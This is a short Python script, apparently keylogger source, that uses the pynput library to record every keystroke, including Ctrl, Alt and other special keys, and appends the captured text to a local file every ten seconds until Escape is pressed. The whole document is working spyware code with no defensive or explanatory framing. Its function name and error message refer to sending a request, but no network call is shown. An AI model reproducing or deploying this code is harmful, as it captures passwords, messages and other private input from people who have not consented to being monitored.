
from pynput import keyboard
import threading

text = ""
time_interval = 10

def send_post_req():
    global text
    try:
        with open("out.txt", "a", encoding="utf-8") as archivo:
        
            archivo.write(text)
            text = ""
        
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")

def on_press(key):
    global text

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key in (keyboard.Key.shift, keyboard.Key.shift_r):
        pass
    elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
        text += "[CTRL]+"
    elif key == keyboard.Key.alt or key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
        text += "[ALT]+"
    elif key == keyboard.Key.backspace:
        text += "[BASKSPACE]"
    elif key == keyboard.Key.esc:
        return False
    else:
        if hasattr(key, 'char') and key.char is not None:
            if 1 <= ord(key.char) <= 26:
                letra = chr(ord(key.char) + 96)
                text += letra
            else:
                text += key.char
        else:
            text += f"[{str(key).replace('Key.', '')}]"

with keyboard.Listener(
    on_press=on_press) as listener:
    send_post_req()
    listener.join()

